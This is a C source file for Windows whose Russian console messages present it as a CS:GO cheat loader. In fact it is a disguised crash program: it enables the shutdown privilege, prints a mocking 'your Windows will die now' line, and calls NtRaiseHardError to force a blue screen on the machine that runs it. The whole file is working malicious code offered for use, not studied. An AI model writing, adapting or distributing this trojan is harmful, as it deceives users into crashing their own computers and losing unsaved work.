#include <windows.h>
#include <stdio.h>
#include <locale.h>

typedef NTSTATUS(WINAPI *NtRaiseHardError_t)(
    NTSTATUS ErrorStatus,
    ULONG NumberOfParameters,
    ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters,
    ULONG ResponseOption,
    PULONG Response
);
#pragma comment(lib, "advapi32.lib")

int main() {
    SetConsoleCP(CP_UTF8);
    SetConsoleOutputCP(CP_UTF8);
    setlocale(LC_ALL, "ru_RU.UTF-8");

    HMODULE ntdll = LoadLibraryA("ntdll.dll");
    if (!ntdll) {
        printf("Ошибка загрузки ксго\n");getchar();
        return 1;
    }
    NtRaiseHardError_t NtRaiseHardError = (NtRaiseHardError_t)GetProcAddress(ntdll, "NtRaiseHardError");

    if (!NtRaiseHardError) {
        printf("Ошибка ксго\n");getchar();
        return 1;
    }

    TOKEN_PRIVILEGES tp;
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LookupPrivilegeValueA(NULL, SE_SHUTDOWN_NAME, &tp.Privileges[0].Luid);
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
        printf("Загрузка читов, подождите...\n");
        Sleep(3000);
    } else {
        printf("Ошибка загрузки читов или ксго\n");getchar();
        return 1;
    }

    printf("Хаха щутка ваша виндус сейчас умрет, подождите...\n");
    ULONG response;
    NTSTATUS status = NtRaiseHardError(
        0xC0000420,
        0,
        0,
        NULL,
        6,
        &response
    );
    

    if (status != 0) {
        printf("ошибка файлов ксго\n", status);getchar();
    } else {
        printf("читы запущены успешно\n");getchar();
    }

    return 0;
}